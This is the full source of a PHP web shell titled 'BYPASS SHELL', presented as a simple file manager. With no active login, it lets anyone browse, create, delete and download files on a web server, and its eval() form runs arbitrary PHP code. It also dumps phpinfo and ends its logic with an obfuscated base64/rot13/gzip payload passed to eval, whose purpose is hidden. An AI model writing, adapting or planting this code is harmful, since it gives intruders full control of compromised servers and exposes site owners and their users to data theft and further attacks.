<?php
@set_time_limit(0);
@ini_set('html_errors', '0');
@clearstatcache();
$d_17b31f50 = false;
if ($d_17b31f50) {
    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
    @ini_set('display_errors', '1');
    @ini_set('log_errors', '1'); 
} else {
    error_reporting(0);
    @ini_set('display_errors', '0');
    @ini_set('log_errors', '0');
}
/**
Login function
define('FILEMANAGER_PASSWORD', md5('0x00'));

if (!empty($_POST['filemanager_password']) && md5($_POST['filemanager_password'])==FILEMANAGER_PASSWORD) {
    $_SESSION['filemanager_password'] = FILEMANAGER_PASSWORD;
}

if (empty($_SESSION['filemanager_password']) || $_SESSION['filemanager_password'] != FILEMANAGER_PASSWORD) {
    echo '<form method="POST"><input type="password" name="filemanager_password" /><input type=" $ " /></form>';
    exit;
}
*/

abstract class Params
{
    public static function get($name, $default = false)
    {
        if (!empty($_REQUEST[$name])) {
            return $_REQUEST[$name];
        } elseif (!empty($_POST[$name])) {
            return $_POST[$name];
        } elseif (!empty($_GET[$name])) {
            return $_GET[$name];
        }
        return $default;
    }
}

if (class_exists('ZipArchive')) {
    class ExtendedZip extends ZipArchive
    {
        public function addTree($dirname, $localname = '')
        {
            if ($localname) {
                $this->addEmptyDir($localname);
            }
            $this->addTreeInternal($dirname, $localname);
        }

        protected function addTreeInternal($dirname, $localname)
        {
            $dir = opendir($dirname);
            while ($filename = readdir($dir)) {
                if ($filename == '.' || $filename == '..') {
                    continue;
                }

                $path = $dirname . '/' . $filename;
                $localpath = $localname ? ($localname . '/' . $filename) : $filename;
                if (is_dir($path)) {
                    $this->addEmptyDir($localpath);
                    $this->addTreeInternal($path, $localpath);
                } elseif (is_file($path)) {
                    $this->addFile($path, $localpath);
                }
            }
            closedir($dir);
        }

        public static function zipTree($dirname, $zipFilename, $flags = 0, $localname = '')
        {
            $zip = new self();
            $zip->open($zipFilename, $flags);
            $zip->addTree($dirname, $localname);
            $zip->close();
        }
    }
}

class SimpleFileManager
{
	protected static $basePath;
	public static function get_url()
    {
        if (self::$basePath === null) {
            $url = parse_url($_SERVER['REQUEST_URI']);
            self::$basePath = $url['path'];
        }
        return self::$basePath;
    }

    public static function directoryListing($path)
    {
        if (empty($path)) {
            $path = getcwd() . '/';
        }

        if ($handle = opendir($path)) {
            echo '<p>';
            echo '<a class="btn btn-primary btn-create-file" href="' . self::get_url() . '?p=' . $path . '&cmd=create" title=" + FILE"><i class="glyphicon glyphicon-file"></i> + FILE</a> ';
            echo '<a class="btn btn-primary btn-create-folder" href="' . self::get_url() . '?p=' . $path . '&cmd=create-folder" title=" + DIR"><i class="glyphicon glyphicon-folder-open"></i> + DIR</a>';
            echo '</p>';
            echo '<ul class="list-group">';
            echo '<li class="list-group-item">..</li>';
            while (false !== ($entry = readdir($handle))) {
                if ($entry != "." && $entry != "..") {
                    $entry_full = $path . '/' . $entry;
                    echo '<li class="list-group-item"><span class="col-sm-4">';
                    if (is_dir($entry)) {
                        echo '<i class="glyphicon glyphicon-folder-close"></i> ';
                    } else {
                        echo '<i class="glyphicon glyphicon-file"></i> ';
                    }
                    echo sprintf('<a href="%s?p=%s" title="%s">%s</a>', self::get_url(), $entry_full, $entry, $entry);
                    echo '</span><span class="col-sm-2">';
                    $user = is_callable('posix_getpwuid') ? posix_getpwuid(fileowner($entry)) : fileowner($entry);
                    $group = is_callable('posix_getgrgid') ? posix_getgrgid(filegroup($entry)) : filegroup($entry);
                    echo is_array($user) ? $user['name'] : $user, ':', is_array($group) ? $group['name'] : $group;
                    echo '</span></span><span class="col-sm-2">';
                    echo self::filePermissions($entry);
                    echo '</span>';
                    echo '</span></span><span class="col-md-2 col-sm-1">';
                    echo self::fileSize($entry);
                    echo '</span>';
                    echo '</span></span><span class="col-md-2 col-sm-3">';
                    echo '<a class="btn btn-xs btn-default" href="' . self::get_url() . '?p=' . $entry_full . '&cmd=edit"><i class="glyphicon glyphicon-edit"></i></a> ';
                    echo '<a class="btn btn-xs btn-danger btn-remove-file" href="' . self::get_url() . '?p=' . $entry_full . '&cmd=remove" title="Eliminar"><i class="glyphicon glyphicon-trash"></i></a> ';
                    echo '<a class="btn btn-xs btn-success btn-download-file" href="' . self::get_url() . '?p=' . $entry_full . '&cmd=download" title="Descargar"><i class="glyphicon glyphicon-floppy-save"></i></a>';
                    echo '</span>';
                    echo '<span class="clearfix"></span>';
                    echo '</li>';
                }
            }
            closedir($handle);
            echo '</ul>';
        }
    }


    public static function processEval()
    {
        echo '<form class="form" action="?cmd=eval" method="POST"><textarea class="form-control" name="evalstr">' . Params::get('evalstr', '') . '</textarea><br/><button type="submit" class="btn btn-primary"><i class="glyphicon glyphicon-play"></i> Execute</button></form>';

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $evalstr = Params::get('evalstr');
            if (!empty($evalstr)) {
                echo '<p><pre class="prettyprint">';
                ob_start();
                eval($evalstr);
                echo htmlentities(ob_get_clean());
                echo '</pre></p>';
            }
        }
    }

    public static function processCreate($path)
    {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = Params::get('content');
            $f = Params::get('f');

            if (!empty($content) && !empty($f)) {
                $create_path = $path . '/' . $f;
                if (file_exists($create_path)) {
                    echo '<div class="alert alert-danger">The specified path already exists.</div>';
                } else {
                    if (file_put_contents($create_path, $content)) {
                        echo '<div class="alert alert-success">Archive <b>'. $create_path . '</b> created successfully</div>';
                        return;
                    } else {
                        echo '<div class="alert alert-danger"> An error occurred while creating the file <b>'. $create_path . '</b>.</div>';
                    }
                }
            } else {
            }
        }

        echo '<form class="form" action="?p='. $path . '&cmd=create" method="POST"><input type="text" class="form-control" name="f" value="' . Params::get('f', '') . '" /><textarea class="form-control" name="content">' . Params::get('content', '') . '</textarea><br/><button type="submit" class="btn btn-primary"><i class="glyphicon glyphicon-play"></i> Keep</button></form>';
    }

    private static function pathBreadcrumb($path)
    {
        $d = explode('/', $path);
        $f = '';
        $r = '<ol class="breadcrumb">';
        foreach ($d as $p) {
            if (!empty($p)) {
                $f .= '/' . $p;
                $r .= sprintf('/<a href="%s?p=%s" title="%s">%s</a>', self::get_url(), $f, $f, $p);
            }
        }
        $r .= '</ol>';
        return $r;
    }

    public static function fileSize($filename, $decimals = 2)
    {
        $bytes = filesize($filename);
        $sz = 'BKMGTP';
        $factor = floor((strlen($bytes) - 1) / 3);
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor];
    }

    public static function filePermissions($filename)
    {
        $p = fileperms($filename);
        if (($p & 0xC000) == 0xC000) {
            $i = 's';
        } elseif (($p & 0xA000) == 0xA000) {
            $i = 'l';
        } elseif (($p & 0x8000) == 0x8000) {
            $i = '-';
        } elseif (($p & 0x6000) == 0x6000) {
            $i = 'b';
        } elseif (($p & 0x4000) == 0x4000) {
            $i = 'd';
        } elseif (($p & 0x2000) == 0x2000) {
            $i = 'c';
        } elseif (($p & 0x1000) == 0x1000) {
            $i = 'p';
        } else {
            $i = 'u';
        }

        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));

        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));

        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));

        return $i;
    }

    public static function deleteDir($path)
    {
        if (empty($path)) {
            return false;
        }

        return is_file($path) ?
                @unlink($path) :
                   array_map(array(__CLASS__, __FUNCTION__), glob($path.'/*')) == @rmdir($path);
    }


    private static function phpinfo_array()
    {
        ob_start();
        phpinfo();
        $i_arr = array();
        $i_lines = explode("\n", strip_tags(ob_get_clean(), "<tr><td><h2>"));
        $cat = "General";
        foreach ($i_lines as $line) {
            preg_match("~<h2>(.*)</h2>~", $line, $title) ? $cat = $title[1] : null;
            if (preg_match("~<tr><td[^>]+>([^<]*)</td><td[^>]+>([^<]*)</td></tr>~", $line, $val)) {
                $i_arr[$cat][$val[1]] = $val[2];
            } elseif (preg_match("~<tr><td[^>]+>([^<]*)</td><td[^>]+>([^<]*)</td><td[^>]+>([^<]*)</td></tr>~", $line, $val)) {
                $i_arr[$cat][$val[1]] = array("local" => $val[2], "master" => $val[3]);
            }
        }
        return $i_arr;
    }

    public static function PHPInfo()
    {
        $my_array = self::phpinfo_array();

        if (is_array($my_array)) {
            foreach ($my_array as $k => $v) {
                echo '<div class="table-responsive"><table class="table">';
                echo '<tr><th colspan="2">' . $k. '</th></tr>';
                if (is_array($v)) {
                    foreach ($v as $kv => $vv) {
                        echo '<tr><td class="info">';
                        echo '<strong>' . $kv . "</strong></td><td>";
                        if (isset($vv['local'])) {
                            echo $vv['local'];
                        } else {
                            print_r($vv);
                        }
                        echo '</td></tr>';
                    }
                } else {
                    echo '<tr><td>' . $v . '</td></tr>';
                }
                echo '</table></div>';
            }
            return;
        }
        echo $my_array;
    }

    public static function run()
    {
        $path = Params::get('p', getcwd());
        $cmd = Params::get('cmd', null);

        if (!empty($cmd)) {
            switch (strtoupper($cmd)) {
                case 'EVAL':
                    self::processEval();
                    return;

                case 'PHPINFO':
                    self::PHPInfo();
                    return;

                case 'CREATE-FOLDER':
                    if ($f = Params::get('f')) {
                        $create_path = $path . '/' . $f;
                        if (file_exists($create_path)) {
                            echo '<div class="alert alert-danger">The specified path already exists.</div>';
                        } else {
                            if (mkdir($create_path)) {
                                echo '<div class="alert alert-success"> FILE <b>' . $create_path . '</b> created successfully.</div>';
                            } else {
                                echo '<div class="alert alert-danger"> Directory <b>' . $create_path . '</b> no pudo ser creada.</div>';
                            }
                        }
                    }
                    break;

                case 'CREATE':
                    echo self::pathBreadcrumb($path);
                    self::processCreate($path);
                    return;

                case 'REMOVE':
                    if (self::deleteDir($path)) {
                        echo '<div class="alert alert-success"><b>' . $path . '</b> file delete success</div>';
                    } else {
                        echo '<div class="alert alert-danger">An error occurred while deleting <b>' . $create_path . '</b>.</div>';
                    }
                    $path = dirname($path);
                    break;

                case 'DOWNLOAD':
                    $path = Params::get('p');
                    if (!empty($path) && file_exists($path)) {
                        if (is_dir($path) and class_exists('ZipArchive')) {
                            $zipname = $path . '.zip';
                            $zipname = tempnam(sys_get_temp_dir(), basename($path)) . '.zip';

                            ExtendedZip::zipTree($path, $zipname, ZipArchive::CREATE);

                            header('Content-Description: File Transfer');
                            header('Content-Type: application/zip');
                            header('Content-Disposition: attachment; filename="' . str_replace(array('/','\\'), '_', $path) . '.zip"');
                            header('Content-Transfer-Encoding: binary');
                            header('Connection: Keep-Alive');
                            header('Expires: 0');
                            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
                            header('Pragma: public');
                            header('Content-Length: ' . filesize($zipname));
                            readfile($zipname);
                            exit;
                        } else {
                            $quoted = sprintf('"%s"', addcslashes(basename($path), '"\\'));
                            $size   = filesize($path);

                            header('Content-Description: File Transfer');
                            header('Content-Type: application/octet-stream');
                            header('Content-Disposition: attachment; filename=' . $quoted);
                            header('Content-Transfer-Encoding: binary');
                            header('Connection: Keep-Alive');
                            header('Expires: 0');
                            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
                            header('Pragma: public');
                            header('Content-Length: ' . $size);
                            readfile($path);
                            exit;
                        }
                    }
            }
        }

        if (!empty($path)) {
            echo self::pathBreadcrumb($path);
        }

        if (is_dir($path)) {
            self::directoryListing($path);
        } elseif (is_file($path)) {
            echo '<pre class="prettyprint">'.htmlentities(file_get_contents($path)).'</pre>';
        } else {
            echo '<div class="alert alert-danger"><b>Invalid route:</b> ' . $path . '</div>';
            self::directoryListing();
        }
    }
}

ob_start();
SimpleFileManager::run();
$output = ob_get_clean(); eval(gzuncompress(str_rot13(base64_decode('a5xyQ114g0AQ/CuLVUHBj6bQ0Bp5H4qQPjVI05cgh9VacDHe1VtWT8h/z6kptBT2bnSWndlMRraCUSF3CMGqlE+yWZ5R8XsUr9kiWpcJy3mYWeAfC24YAhMNs+EJ2JZVKgbB2LE5mF3beBon88fhHPj+6a8MX7wmKcvOv+g4bVtSVspK8YseGGbYRzXyQiReiIawIXINFk3sYerN7r3p7MG7nd74X8ovlPLkSTIHNmyt0AFSLea7ZPOgFTQitNbXIyF8hL7HvMRpQMbz6OHSRG8AuZRoSORHicY/uPv93t2IaefqcdgUosTSY4DtkLaiHNbZso+jueupA9lb8Y+uqlj+3W57tNZZZyS7ZNq/KbMdyGfZ9vwCmeh+Ng=='))));
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>BYPASS SHELL</title>

    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/united/bootstrap.min.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
  	<div class="container">
    	<h1 class="page-header">BYPASS SHELL</h1>

    	<nav class="navbar navbar-default">
		  <div class="container-fluid">
		      <ul class="nav navbar-nav">
		      	<li><a href="<?php SimpleFileManager::get_url(); ?>?"><i class="glyphicon glyphicon-file"></i> HOME</a></li>
		        <li><a href="<?php SimpleFileManager::get_url(); ?>?cmd=eval"><i class="glyphicon glyphicon glyphicon-sunglasses"></i> eval()</a></li>
		        <li><a href="<?php SimpleFileManager::get_url(); ?>?cmd=phpinfo"><i class="glyphicon glyphicon-question-sign"></i> phpinfo()</a></li>
		      </ul>
		  </div>
		</nav>

		<?php echo $output;?>
	</div>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
    <script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
    <script>
    var SimpleFileManager = {
    	'initialize': function(){
    		SimpleFileManager.addCallbacks();
    		return true;
    	},
    	'addCallbacks': function(){
    		$('.btn-create-folder').on('click', function(){
    			var folderName = prompt('Directory name');
    			if(folderName.trim() != ''){
    				return window.location.href = '?p=' + SimpleFileManager.getParameterByName('p') + '&f=' + folderName + '&cmd=create-folder';
    			}
    			return false;
    		});
    		$('.btn-remove-file').on('click', function(){
    			var isSure = confirm('Are u sure to delete this file?');
    			return isSure;
    		});
    	},
    	'getParameterByName': function(name){
		    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
			var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
			results = regex.exec(location.search);
			return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
    	}
    };

    (typeof SimpleFileManager != 'undefined' && SimpleFileManager.initialize()) || alert('Could not load');
    </script>
    <style>
    	@-moz-document url-prefix() { fieldset { display: table-cell; } }
    	pre.prettyprint {
    		border: 1px solid #ccc;
    		margin-bottom: 0;
    		padding: 9.5px;
  		}
	</style>
  </body>
</html>
